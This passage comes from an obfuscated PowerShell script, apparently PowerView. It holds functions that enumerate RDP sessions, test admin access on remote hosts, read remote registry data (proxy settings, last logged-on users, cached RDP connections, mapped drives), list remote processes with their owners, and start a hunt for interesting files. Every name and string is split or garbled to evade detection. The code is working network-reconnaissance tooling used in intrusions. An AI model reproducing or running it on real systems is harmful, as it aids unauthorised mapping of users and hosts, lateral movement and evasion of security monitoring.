                        $RDPSession  |   Add-Member ('Notep' +  'ro'  + 'pe'  +'rty' ) 'ID' $Info.SEssIOnid
                        $RDPSession   |   Add-Member (  'Not'+'ep' + 'r'  + 'operty') (  "{1}{0}" -f'tate','S' ) $Info.stAtE

                        $ppBuffer   =   [IntPtr]::zErO
                        $pBytesReturned  =  0

                        
                        
                        $Result2 =   $Wtsapi32::WTsqueRYsesSIONInFormaTIon( $Handle, $Info.SEsSIONiD, 14, [ref]$ppBuffer, [ref]$pBytesReturned);  $LastError2  =   [Runtime.InteropServices.Marshal]::getLAStwin32eRrOr( )

                        if ( $Result2 -eq 0 ) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message) "
                        }
                        else {
                            $Offset2   = $ppBuffer.ToInT64(  )
                            $NewIntPtr2   = New-Object ( 'S'  +  'y'  +'stem.I'+'ntptr'  ) -ArgumentList $Offset2
                            $Info2  = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                            $SourceIP   = $Info2.addRESS
                            if ( $SourceIP[2] -ne 0 ) {
                                $SourceIP =   [String]$SourceIP[2]+'.'+[String]$SourceIP[3]  + '.'+ [String]$SourceIP[4]+ '.'+ [String]$SourceIP[5]
                            }
                            else {
                                $SourceIP  = $Null
                            }

                            $RDPSession | Add-Member (  'Noteprop'  + 'e'+ 'rty') ("{0}{1}{2}"-f 'S','o','urceIP' ) $SourceIP
                            $RDPSession.pSObJect.tYPENaMES.iNSert( 0, ("{4}{2}{0}{1}{3}" -f 'essionIn','f','w.RDPS','o','PowerVie' )  )
                            $RDPSession

                            
                            $Null   =   $Wtsapi32::WTSFReememORY( $ppBuffer)

                            $Offset += $Increment
                        }
                    }
                    
                    $Null   =  $Wtsapi32::wTSfReememOrYex(2, $ppSessionInfo, $pCount)
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                }
                
                $Null =   $Wtsapi32::WtScLoseSERVer(  $Handle  )
            }
            else {
                Write-Verbose (  '[Ge' +  't'  + '-Net'  +  'RDPSessio'  + 'n] ' +'Error' + ' ' + 'op' +'ening'+  ' '+  'the' +  ' '  +'Rem' +'ote '+ 'Desktop' +' ' +'Se'  + 'ssion '+'Host'  + ' ' + '(RD'+ ' ' + 'Sessio'+  'n '+  'H'  +  'ost) '  +  'serv'+ 'er '  +  'f' +  'or: '  +  "$ComputerName"  )
            }
        }
    }

    END {
        if ($LogonToken ) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function T`eSt-adM`i`NAcCE`ss {


    [OutputType(  {"{2}{0}{5}{3}{4}{1}" -f'rView.Adm','s','Powe','A','cces','in'}  )]
    [CmdletBinding(  )]
    Param(
        [Parameter(pOsiTiON   = 0, vaLUeFROMpIpElInE  =  $True, vAlUefrOmPIPELINEbypRoPeRtyNaME = $True )]
        [Alias({"{1}{0}{2}" -f 'ost','H','Name'}, {"{3}{1}{2}{0}"-f'e','ns','hostnam','d'}, {"{1}{0}" -f'me','na'} )]
        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $ComputerName  =  ("{2}{1}{0}"-f 'ost','ocalh','l'  ),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  =  [Management.Automation.PSCredential]::eMpty
     )

    BEGIN {
        if ( $PSBoundParameters[( "{3}{1}{0}{2}" -f 'nti','ede','al','Cr')] ) {
            $LogonToken =   Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ( $Computer in $ComputerName) {
            
            
            $Handle =   $Advapi32::OPenscmANAGeRw(  "\\$Computer", ("{2}{1}{0}" -f'esActive','ic','Serv' ), 0xF003F) ;  $LastError  =  [Runtime.InteropServices.Marshal]::gEtlastWiN32errOr(    )

            $IsAdmin  = New-Object (  'PSO' +  'bj' + 'ect')
            $IsAdmin |   Add-Member ( 'Notepro'  + 'p'  +  'erty'  ) ( "{0}{1}{2}"-f 'C','omp','uterName') $Computer

            
            if ( $Handle -ne 0  ) {
                $Null  =  $Advapi32::CLOsesErViCEhandlE( $Handle)
                $IsAdmin  |   Add-Member ( 'N'+'ote'+ 'pr' +'operty') ( "{1}{0}" -f 'dmin','IsA'  ) $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                $IsAdmin | Add-Member ('Not' + 'e' +'pro'+ 'perty'  ) (  "{0}{1}{2}"-f'IsA','dm','in') $False
            }
            $IsAdmin.psoBjECT.tYpenameS.iNSERt( 0, ("{1}{4}{0}{3}{5}{2}"-f'mi','PowerVi','ess','nAc','ew.Ad','c' )  )
            $IsAdmin
        }
    }

    END {
        if ( $LogonToken  ) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function G`Et-Ne`TcoMp`UTE`RsIte`NamE {


    [OutputType(  {"{4}{3}{0}{1}{2}" -f'w.C','ompu','terSite','Vie','Power'} )]
    [CmdletBinding( )]
    Param(
        [Parameter( posITIon  =   0, VAluEfrOMpiPELine = $True, VALuEfroMpIpelINEbypRopeRtYNAmE  = $True)]
        [Alias( {"{0}{1}" -f 'HostN','ame'}, {"{3}{1}{0}{2}" -f'hostnam','ns','e','d'}, {"{0}{1}"-f'na','me'} )]
        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $ComputerName =   ("{2}{0}{1}"-f'o','calhost','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(    )]
        $Credential   = [Management.Automation.PSCredential]::Empty
     )

    BEGIN {
        if (  $PSBoundParameters[("{2}{1}{3}{0}"-f 'ial','d','Cre','ent' )] ) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName ) {
            
            if (  $Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$' ) {
                $IPAddress   =   $Computer
                $Computer =   [System.Net.Dns]::geThosTBYaDdRESs(  $Computer  )  |   Select-Object -ExpandProperty (  'H'  +  'ostN'  +'ame' )
            }
            else {
                $IPAddress   =   @(Resolve-IPAddress -ComputerName $Computer  )[0].IpAddRESS
            }

            $PtrInfo  =  [IntPtr]::zEro

            $Result = $Netapi32::DSGETSITenAME($Computer, [ref]$PtrInfo  )

            $ComputerSite  = New-Object (  'PSObj' +  'ec' +'t'  )
            $ComputerSite   | Add-Member ( 'Notep'+ 'rop'  +  'ert'  +'y' ) (  "{2}{0}{1}" -f'rNam','e','Compute') $Computer
            $ComputerSite  |   Add-Member ( 'Note' + 'p' + 'ropert'+  'y'  ) (  "{0}{2}{1}"-f'I','ress','PAdd'  ) $IPAddress

            if (  $Result -eq 0) {
                $Sitename   =  [System.Runtime.InteropServices.Marshal]::PtRTostRInGAuTo($PtrInfo )
                $ComputerSite   | Add-Member ( 'Not'+  'e'  +'property' ) (  "{0}{1}{2}" -f'Si','teNam','e') $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                $ComputerSite   |  Add-Member (  'Notep' +'rop'+ 'er'  +  'ty'  ) ("{0}{1}"-f 'Site','Name'  ) ''
            }
            $ComputerSite.psoBjECt.tYPeNamES.inseRt(  0, (  "{0}{1}{3}{4}{2}"-f 'PowerView.Com','pute','ite','r','S'  )  )

            
            $Null  =  $Netapi32::neTaPibUFfERfrEE($PtrInfo)

            $ComputerSite
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function GEt`-W`M`iregPrOXY {


    [OutputType(  {"{3}{0}{4}{5}{1}{2}" -f'erVi','ProxySet','tings','Pow','ew','.'} )]
    [CmdletBinding()]
    Param( 
        [Parameter( PoSItiON  =   0, VAlUeFROMPipeLine   = $True, valUeFrOMPipeLINEbypROpErTyNAME  =  $True)]
        [Alias({"{2}{1}{0}"-f 'tName','s','Ho'}, {"{0}{1}{2}" -f'dnshost','nam','e'}, {"{0}{1}" -f'nam','e'}  )]
        [ValidateNotNullOrEmpty(    )]
        [String[]]
        $ComputerName  =   $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  =   [Management.Automation.PSCredential]::emptY
      )

    PROCESS {
        ForEach (  $Computer in $ComputerName) {
            try {
                $WmiArguments =  @{
                    ("{0}{1}"-f'Li','st' )  =  $True
                    ( "{1}{0}"-f 's','Clas'  )  = ("{1}{0}{2}" -f 'egPro','StdR','v'  )
                    ( "{0}{2}{1}"-f 'Nam','space','e'  ) = (( (  "{1}{2}{0}"-f'lt','root','{0}defau' ))  -f  [CHaR]92  )
                    ( "{0}{3}{1}{2}"-f 'Com','rnam','e','pute' )  = $Computer
                    (  "{2}{0}{1}"-f 'rror','Action','E' )   =  ("{1}{0}"-f 'op','St')
                }
                if (  $PSBoundParameters[( "{1}{0}{2}"-f'ia','Credent','l'  )] ) { $WmiArguments[(  "{0}{1}{2}"-f 'Crede','n','tial')] =   $Credential }

                $RegProvider =  Get-WmiObject @WmiArguments
                $Key  =   ( (  ("{11}{10}{7}{13}{3}{4}{8}{6}{12}{2}{0}{9}{5}{1}"-f 'naD','tings','tVersio','ftaDN','Wi','rnet Set','C','icr','ndowsaDN','NInte','WAREaDNM','SOFT','urren','oso'  )) -RePLacE ( [CHaR]97 +[CHaR]68  +[CHaR]78 ),[CHaR]92)

                
                $HKCU  =   2147483649
                $ProxyServer  =  $RegProvider.GetStRiNGvALue(  $HKCU, $Key, ( "{2}{0}{1}"-f'ox','yServer','Pr'  )  ).svaLUe
                $AutoConfigURL  = $RegProvider.gEtStRInGVaLuE( $HKCU, $Key, ( "{2}{3}{1}{0}"-f'L','figUR','A','utoCon'  ) ).sVaLUe

                $Wpad =  ''
                if ($AutoConfigURL -and ( $AutoConfigURL -ne '')) {
                    try {
                        $Wpad  = (  New-Object ('Net' +  '.WebC'+'li'+  'en' +  't')).dOWNLoAdSTrIng( $AutoConfigURL )
                    }
                    catch {
                        Write-Warning (  '[Get-WM'  +  'IRegP' +'ro'+ 'xy'  +'] '+  'E' + 'rror '+ 'co'+  'nn'+  'e'  +  'cting '  + 't'  +'o '+ 'A' +  'u'+ 'toCon'+'fi'  +'gURL '  +  ': '+  "$AutoConfigURL"  )
                    }
                }

                if ( $ProxyServer -or $AutoConfigUrl ) {
                    $Out =   New-Object ( 'PS'  +'Ob'  + 'ject'  )
                    $Out   | Add-Member ('N'+'otepr' +'operty'  ) ("{1}{0}{2}"-f'rNam','Compute','e'  ) $Computer
                    $Out |   Add-Member ( 'N'  +  'otep' +'roper' +'ty' ) ("{1}{2}{0}"-f'ver','P','roxySer') $ProxyServer
                    $Out  |   Add-Member (  'No'  + 't'  +'ep' + 'roperty') ( "{1}{3}{0}{2}"-f'igU','AutoCo','RL','nf'  ) $AutoConfigURL
                    $Out  |  Add-Member ( 'N'+  'o'  + 't'+ 'eproperty'  ) ( "{0}{1}" -f'W','pad'  ) $Wpad
                    $Out.pSObJect.tYPEnaMeS.iNseRt(  0, ( "{2}{1}{4}{0}{3}" -f'w.Proxy','we','Po','Settings','rVie'  ))
                    $Out
                }
                else {
                    Write-Warning (  '[' + 'Get-WMIR' + 'egPro' +'xy]'+  ' ' + 'No' +  ' '+ 'prox'  +  'y'+  ' '+  'set'+  'tings'  +  ' '+  'foun'  +'d '  + 'fo'  + 'r ' + "$ComputerName"  )
                }
            }
            catch {
                Write-Warning ('['+  'Get-WM' + 'I' + 'RegPr' +  'oxy'  + '] '  + 'Err' + 'or '  +'en' +  'ume'+ 'ratin'  +  'g '  +  'prox'+  'y '  +'s' +  'etti' +  'ngs ' +  'fo'  +  'r ' +  "$ComputerName "  +': ' +  "$_"  )
            }
        }
    }
}


function GEt-wM`ireGLAstLo`GGE`d`On {


    [OutputType(  {"{4}{0}{6}{5}{2}{3}{1}"-f'rVie','er','gge','dOnUs','Powe','o','w.LastL'}  )]
    [CmdletBinding( )]
    Param(
        [Parameter(poSITiOn = 0, vaLuEFrOMpIpElinE  = $True, ValueFrOMPiPElinEBypRopERTynAmE =  $True  )]
        [Alias( {"{2}{0}{1}"-f 'tNa','me','Hos'}, {"{1}{2}{3}{0}" -f'e','d','n','shostnam'}, {"{1}{0}"-f 'me','na'}  )]
        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $ComputerName   =   ("{0}{2}{1}" -f 'local','st','ho' ),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential = [Management.Automation.PSCredential]::emPTY
      )

    PROCESS {
        ForEach ($Computer in $ComputerName ) {
            
            $HKLM =   2147483650

            $WmiArguments =   @{
                ( "{0}{1}" -f 'Lis','t'  )   = $True
                (  "{1}{0}" -f 'ass','Cl')   = (  "{1}{3}{0}{2}"-f 'Pro','St','v','dReg' )
                ("{2}{1}{0}" -f 'ace','amesp','N'  )  = (  (  ( "{1}{2}{3}{0}{4}" -f 'l','rootPzW','d','efau','t' )).REPLaCE( 'PzW','\'))
                (  "{1}{2}{0}" -f'tername','Co','mpu')   =  $Computer
                ( "{0}{2}{1}"-f 'Er','n','rorActio'  ) =   ( "{3}{2}{0}{1}" -f'ntinu','e','o','SilentlyC'  )
            }
            if ( $PSBoundParameters[( "{2}{0}{1}"-f'e','dential','Cr'  )] ) { $WmiArguments[( "{3}{1}{2}{0}"-f'tial','e','den','Cr' )]   =   $Credential }

            
            try {
                $Reg =  Get-WmiObject @WmiArguments

                $Key  =  ((  ("{2}{17}{0}{12}{5}{13}{11}{4}{14}{7}{10}{22}{20}{18}{15}{16}{19}{9}{6}{1}{3}{21}{8}"-f'EoM','on','SOF','oMTLo','Window','icros','i','MT','UI','t','C','toMT','TM','of','so','uth','e','TWAR','oMTA','ntica','ersion','gon','urrentV' )  ) -rEPlACE ([ChAr]111 + [ChAr]77+ [ChAr]84),[ChAr]92  )
                $Value   =  ("{1}{2}{3}{4}{0}"-f 'r','Las','tLog','ged','OnUse' )
                $LastUser = $Reg.GetsTrinGvaLUE(  $HKLM, $Key, $Value).SVAlue

                $LastLoggedOn   = New-Object (  'PS'  +  'Ob' + 'ject' )
                $LastLoggedOn | Add-Member ('Notepr' +  'op'+  'er' +'ty'  ) (  "{3}{2}{0}{1}"-f'erNam','e','t','Compu'  ) $Computer
                $LastLoggedOn  | Add-Member ( 'N' +  'ot' +  'eprope' +  'rty'  ) ( "{0}{1}{2}{3}" -f 'L','a','stLo','ggedOn') $LastUser
                $LastLoggedOn.pSOBjecT.typEnaMEs.inSERT(0, (  "{7}{1}{3}{2}{0}{4}{6}{5}"-f'Last','i','w.','e','Logge','ser','dOnU','PowerV'  ) )
                $LastLoggedOn
            }
            catch {
                Write-Warning ('[G'+'e' +  't-'+'W'  + 'MIRegLastLog'+  'gedOn] ' + 'Err' + 'or '+  'o' +  'penin'  +  'g '+'re'  +'mote'+ ' ' +'r'+  'egi' + 'stry ' + 'on' +  ' '+  "$Computer. "+'Remo' + 'te '+ 're'  +'gist' +  'ry '+  'lik'+'ely '  + 'not'+ ' ' + 'enable'  +  'd'+ '.'  )
            }
        }
    }
}


function get`-wMIregCaChE`d`RDp`CONnecTioN {


    [OutputType( {"{0}{4}{2}{3}{5}{1}"-f'PowerView.C','tion','RDPC','onn','ached','ec'} )]
    [CmdletBinding(    )]
    Param(  
        [Parameter(poSiTIon   = 0, VAluEFRoMPipeliNE = $True, VALuEfrOmpipElIneBYproPeRTYnaME   =   $True)]
        [Alias( {"{0}{1}"-f 'Ho','stName'}, {"{0}{2}{1}"-f 'dns','name','host'}, {"{1}{0}"-f 'e','nam'} )]
        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $ComputerName = ("{0}{1}{2}"-f'loca','lh','ost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(    )]
        $Credential = [Management.Automation.PSCredential]::EMPtY
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $HKU  = 2147483651

            $WmiArguments  =   @{
                ( "{1}{0}"-f 'st','Li'  )   = $True
                (  "{0}{1}"-f 'C','lass' )  =   ( "{3}{0}{1}{2}"-f 'tdReg','P','rov','S'  )
                ( "{1}{0}{2}" -f'sp','Name','ace')   =   ((  (  "{0}{2}{1}" -f'root{0','ult','}defa'  ) )  -f [ChAr]92  )
                (  "{2}{0}{1}" -f'ern','ame','Comput'  )  = $Computer
                (  "{2}{1}{0}{3}"-f'rAct','o','Err','ion' )  =   ( "{0}{1}" -f 'Sto','p')
            }
            if ($PSBoundParameters[(  "{0}{2}{1}{3}"-f'Cre','a','denti','l')] ) { $WmiArguments[(  "{2}{1}{0}"-f'ntial','rede','C')] =  $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                
                $UserSIDs  =   (  $Reg.eNUMKey($HKU, '')).snAMES |  Where-Object { $_ -match (  ((  'S-'  + '1-5-21-[0-9]+' + '-[0'  + '-' +'9]+-[' +  '0-9'  +  ']+-'  +'[0-9' +']+I8R')-RePlacE  ( [cHaR]73 +  [cHaR]56+[cHaR]82),[cHaR]36 )  ) }

                ForEach (  $UserSID in $UserSIDs) {
                    try {
                        if (  $PSBoundParameters[( "{1}{2}{0}" -f 'al','Creden','ti')]) {
                            $UserName  =  ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName   =  ConvertFrom-SID -ObjectSid $UserSID
                        }

                        
                        $ConnectionKeys =  $Reg.enuMvAlueS( $HKU,(  "$UserSID\Software\Microsoft\Terminal " + 'Server'  +  ' '  +  ( 'Cli'  +  'ent'+ '{0}Defa'+'ult' )  -f [CHAr]92 )).SnaMeS

                        ForEach (  $Connection in $ConnectionKeys ) {
                            
                            if ($Connection -match ( "{1}{0}"-f'U.*','MR') ) {
                                $TargetServer   =   $Reg.gEtSTriNGvAlUe(  $HKU, (  "$UserSID\Software\Microsoft\Terminal "  +  'S'+  'erver'+  ' '+  ( ( 'C' + 'l'+  'ientFiX'  +'Default')-replaCe  ([CHAr]70 + [CHAr]105 +  [CHAr]88),[CHAr]92 )  ), $Connection).svALUe

                                $FoundConnection =  New-Object ('PS' + 'Obj'  + 'ect')
                                $FoundConnection  |   Add-Member ( 'Note' + 'prope' + 'rt' + 'y'  ) ( "{2}{0}{1}"-f'pute','rName','Com' ) $Computer
                                $FoundConnection  |  Add-Member ('Notep'+'ropert'+'y') ("{0}{1}{2}"-f'U','ser','Name' ) $UserName
                                $FoundConnection   |   Add-Member ( 'N'  +'o'+'tep' +'roperty'  ) ("{1}{0}"-f 'erSID','Us') $UserSID
                                $FoundConnection   | Add-Member (  'Notepr'  +'op'  +'erty' ) ("{1}{0}{2}" -f 'getS','Tar','erver') $TargetServer
                                $FoundConnection |  Add-Member ( 'Not'  +  'epro'  +'perty' ) ("{2}{0}{1}" -f 'se','rnameHint','U'  ) $Null
                                $FoundConnection.PsoBJEcT.TypenAMEs.INSErT(0, ("{1}{5}{6}{2}{3}{7}{0}{4}" -f 'o','Po','Cache','dRDPConnect','n','w','erView.','i' ) )
                                $FoundConnection
                            }
                        }

                        
                        $ServerKeys   =  $Reg.eNUMKEY( $HKU,( "$UserSID\Software\Microsoft\Terminal "+'Serv'  + 'er ' +((  'Clientg'  +  'E' + 'Y' +  'S'+ 'ervers' ) -CREPLaCE (  [cHAr]103 +  [cHAr]69+ [cHAr]89  ),[cHAr]92) )  ).SnamES

                        ForEach ($Server in $ServerKeys) {

                            $UsernameHint = $Reg.GETStrINgvAluE( $HKU, ("$UserSID\Software\Microsoft\Terminal "+'S' + 'erv' +'er '+ "Client\Servers\$Server"  ), ( "{0}{2}{1}" -f 'U','nt','sernameHi'  )).SvALue

                            $FoundConnection =  New-Object ('P'+'SObje'  +'ct' )
                            $FoundConnection   | Add-Member (  'Note'  +'pro' + 'pe' +  'rty') ("{3}{0}{1}{2}"-f 'omputer','Na','me','C' ) $Computer
                            $FoundConnection   |   Add-Member ('Not'+  'epro' +  'per' + 'ty') (  "{1}{0}{2}"-f'e','Us','rName'  ) $UserName
                            $FoundConnection   |   Add-Member ( 'Note'  +  'p'  +  'rop'+  'erty') (  "{2}{0}{1}"-f'rS','ID','Use'  ) $UserSID
                            $FoundConnection  |   Add-Member ('Notepro'  + 'p'  +  'ert'+ 'y' ) (  "{1}{0}{3}{2}"-f 'ge','Tar','er','tServ' ) $Server
                            $FoundConnection | Add-Member ( 'Notep'  + 'roper'+  'ty' ) ( "{2}{1}{3}{0}" -f't','ernameH','Us','in'  ) $UsernameHint
                            $FoundConnection.psoBjECT.TyPeNAmes.INSert(0, (  "{4}{1}{3}{0}{2}{5}" -f 'he','erView.C','dR','ac','Pow','DPConnection') )
                            $FoundConnection
                        }
                    }
                    catch {
                        Write-Verbose (  '[G'+'et'+'-' + 'W'+ 'MIRegCach' +  'ed'+ 'RDPC' +'onnection'  + '] '  +  'Err'+'or'  + ': '+"$_")
                    }
                }
            }
            catch {
                Write-Warning ('[Get-W'  + 'MIRegCached' + 'R'  +  'DPConn'+ 'ec'+ 'tion] ' +'Err'+  'o' +'r '  +  'acces'  + 'sin'  +  'g '  +  "$Computer, "  + 'l'+ 'ik'  +  'ely '  +  'insuffi' +  'c'+'ient '  + 'permi'  +'ssion'+'s '  + 'or'+' '  +'firewal' +'l' +  ' ' +'ru'  +  'les ' +  'o'+ 'n '+  'host' + ': ' +  "$_" )
            }
        }
    }
}


function GEt`-W`MIre`GMO`Un`TeDDR`ive {


    [OutputType( {"{1}{3}{2}{0}{4}" -f 'Dr','Pow','gMounted','erView.Re','ive'}  )]
    [CmdletBinding()]
    Param(  
        [Parameter(  poSiTion   =   0, vaLueFRoMPipEliNe  =   $True, vaLUEfrompipELINebyprOPErTyNAmE   =  $True )]
        [Alias({"{1}{0}{2}" -f'am','HostN','e'}, {"{0}{2}{3}{1}"-f 'dn','e','shostn','am'}, {"{0}{1}"-f'na','me'})]
        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $ComputerName =   ( "{2}{1}{0}"-f'st','ocalho','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential = [Management.Automation.PSCredential]::EmPTy
     )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $HKU = 2147483651

            $WmiArguments = @{
                (  "{0}{1}" -f 'Li','st'  )  =   $True
                ( "{0}{1}"-f 'Clas','s'  )   =   (  "{0}{2}{1}"-f 'S','Prov','tdReg')
                (  "{0}{2}{1}" -f 'Names','ce','pa'  )   =  ( ( (  "{1}{2}{3}{0}{4}" -f 'def','r','oo','t{0}','ault' )  )  -F  [chAr]92 )
                ("{2}{3}{0}{1}"-f 'am','e','Com','putern'  )   = $Computer
                ("{2}{3}{0}{1}"-f 'i','on','Er','rorAct'  )   = ("{0}{1}"-f 'S','top' )
            }
            if ($PSBoundParameters[("{0}{2}{1}"-f 'Cr','ntial','ede')] ) { $WmiArguments[(  "{0}{1}{3}{2}"-f 'C','red','tial','en')]   =  $Credential }

            try {
                $Reg   = Get-WmiObject @WmiArguments

                
                $UserSIDs  =   (  $Reg.eNuMKey( $HKU, ''  )  ).sNAMEs | Where-Object { $_ -match ( ((  'S-'  +'1-5-21-'  +'[0' + '-9'  +  ']+-[' +  '0'  +'-9]+-[0-'  +'9]+-[0-9]+ZcI'  )-creplACe ( [Char]90+[Char]99+[Char]73),[Char]36 )  ) }

                ForEach (  $UserSID in $UserSIDs) {
                    try {
                        if (  $PSBoundParameters[( "{1}{2}{0}" -f'al','Cre','denti' )] ) {
                            $UserName =   ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        $DriveLetters = ($Reg.eNUmKEY($HKU, "$UserSID\Network")).snAMES

                        ForEach ( $DriveLetter in $DriveLetters  ) {
                            $ProviderName   =  $Reg.GETsTRingVaLuE( $HKU, "$UserSID\Network\$DriveLetter", ( "{1}{0}{2}"-f'ider','Prov','Name' )  ).SvaLUe
                            $RemotePath  =  $Reg.GETstriNGVAlue(  $HKU, "$UserSID\Network\$DriveLetter", ("{2}{0}{1}"-f 'moteP','ath','Re')).svALUe
                            $DriveUserName  =  $Reg.geTstriNgVAlue($HKU, "$UserSID\Network\$DriveLetter", (  "{1}{0}{2}"-f'Nam','User','e'  )).sVaLuE
                            if ( -not $UserName  ) { $UserName  =   '' }

                            if ($RemotePath -and (  $RemotePath -ne ''  )) {
                                $MountedDrive  =   New-Object ('PSObj'  +'e'+ 'ct')
                                $MountedDrive  |  Add-Member (  'Notepro'  + 'p' + 'e' + 'rty') (  "{1}{2}{0}" -f'erName','Comp','ut') $Computer
                                $MountedDrive |   Add-Member (  'No'  +  't'+'eproperty') ("{1}{0}{2}" -f 'am','UserN','e'  ) $UserName
                                $MountedDrive   |   Add-Member ('Not' +'e' +'proper' +  'ty'  ) ("{0}{2}{1}" -f 'Use','D','rSI') $UserSID
                                $MountedDrive  |  Add-Member ( 'Notep'+  'ro' +'perty') ("{1}{2}{0}"-f 'er','D','riveLett' ) $DriveLetter
                                $MountedDrive |   Add-Member ( 'Notepro' + 'p' + 'erty'  ) (  "{3}{1}{2}{0}" -f 'erName','o','vid','Pr'  ) $ProviderName
                                $MountedDrive  |  Add-Member ( 'Not'+ 'e'  +'proper'+ 'ty' ) ("{0}{2}{1}"-f 'Rem','Path','ote') $RemotePath
                                $MountedDrive  |  Add-Member ( 'Note'  +  'prop' +'e'+'rty'  ) ( "{1}{0}{2}" -f 'UserN','Drive','ame') $DriveUserName
                                $MountedDrive.pSobJeCt.TyPeNaMEs.INsERT(  0, (  "{0}{6}{1}{2}{5}{4}{3}" -f 'PowerView','M','o','tedDrive','n','u','.Reg') )
                                $MountedDrive
                            }
                        }
                    }
                    catch {
                        Write-Verbose ('[Ge'  +  't-WM'  +'IRegMo'+'unt'  +'edDri'  +'ve] '+  'Error' + ': ' +  "$_"  )
                    }
                }
            }
            catch {
                Write-Warning ('['  +  'G'+ 'et'+'-W' + 'M' +'IRegMount'  +  'edDrive]'+' '  +  'Err'  +  'or '  + 'acc'  +  'e'  +  'ssing ' + "$Computer, "  +'like' + 'ly'+  ' '  +  'insuffi'  +'cien' +  't '  +'p'  +  'ermissi' + 'on'+  's '+ 'o'+'r ' +'f'+'ir' +  'ewall '+  'ru'  + 'les ' + 'on' +' ' +'h'+  'o' +  'st: '  +"$_"  )
            }
        }
    }
}


function G`e`T`-WMIPRoCE`SS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{4}{0}"-f'ss','PSS','ldP','hou','roce'}, '' )]
    [OutputType({"{3}{4}{1}{2}{5}{0}"-f's','Use','rPro','PowerView','.','ces'}  )]
    [CmdletBinding(  )]
    Param( 
        [Parameter( POSitIoN   = 0, vaLueFROMpIpEline  = $True, vAlUEFROMpiPeLinebyPROpERTynAme  = $True )]
        [Alias({"{1}{0}"-f 'me','HostNa'}, {"{0}{2}{1}" -f 'dnshost','me','na'}, {"{1}{0}" -f'e','nam'})]
        [ValidateNotNullOrEmpty(    )]
        [String[]]
        $ComputerName  = ("{1}{0}" -f'host','local' ),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential =   [Management.Automation.PSCredential]::eMpty
     )

    PROCESS {
        ForEach ( $Computer in $ComputerName  ) {
            try {
                $WmiArguments = @{
                    ("{0}{2}{1}" -f 'Co','rName','mpute') =  $ComputerName
                    (  "{0}{1}" -f'Clas','s')  =  ("{2}{0}{1}"-f '32_proce','ss','Win')
                }
                if ($PSBoundParameters[("{0}{2}{1}" -f'Credent','l','ia'  )] ) { $WmiArguments[( "{3}{0}{1}{2}"-f'ede','n','tial','Cr'  )] =   $Credential }
                Get-WMIobject @WmiArguments  |  ForEach-Object {
                    $Owner =  $_.gEtOWnER(    );  
                    $Process   =  New-Object (  'PSOb'+'jec'+ 't')
                    $Process  |   Add-Member (  'Notep'+ 'r'  +'ope' + 'rty') ("{0}{1}{2}"-f'ComputerN','am','e') $Computer
                    $Process  |   Add-Member (  'Not'  + 'epro'+  'p' +'erty') ( "{1}{2}{0}"-f'Name','Proce','ss' ) $_.ProCesSnAME
                    $Process |  Add-Member (  'N' + 'ot'+'ep' +  'roperty') ("{0}{2}{1}"-f'P','ocessID','r') $_.PrOcesSId
                    $Process   |   Add-Member (  'Notepr'  +'op'+'er' +  'ty') (  "{0}{2}{1}"-f 'Dom','n','ai') $Owner.dOmAin
                    $Process   | Add-Member ( 'Notep' +'roper' +  'ty'  ) ("{1}{0}"-f'r','Use'  ) $Owner.USEr
                    $Process.PSoBJECT.TyPENaMes.InSERT(  0, (  "{2}{3}{1}{4}{0}" -f 'ss','serP','PowerView','.U','roce'  )  )
                    $Process
                }
            }
            catch {
                Write-Verbose ( '[Ge'+  't-WMIPro' +'cess'  +  '] '  + 'Erro' +'r '  + 'enum'  + 'e'  +'r' +'ating ' + 're'  + 'mo'+  'te '  + 'pr'  + 'ocesses' +  ' ' + 'on' +' ' +"'$Computer', "+'ac'  + 'cess ' + 'l'+  'ikel'+'y ' +  'den' +  'ie'  + 'd: '  + "$_")
            }
        }
    }
}


function FI`N`d-INTeRe`sTIN`g`File {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{3}{2}{1}{0}"-f 'ss','uldProce','ho','PSS'}, ''  )]
    [OutputType({"{2}{3}{1}{0}" -f 'e','l','Po','werView.FoundFi'})]
    [CmdletBinding(DEFAultPARAMEtErSETNAmE =  {"{5}{4}{3}{1}{2}{0}"-f 'on','at','i','ific','pec','FileS'} )]
    Param(
        [Parameter(POSiTIoN = 0, ValuEFROmPIpelINe  =  $True, vaLUefroMPiPeLiNeBYproPeRtyNaME = $True )]
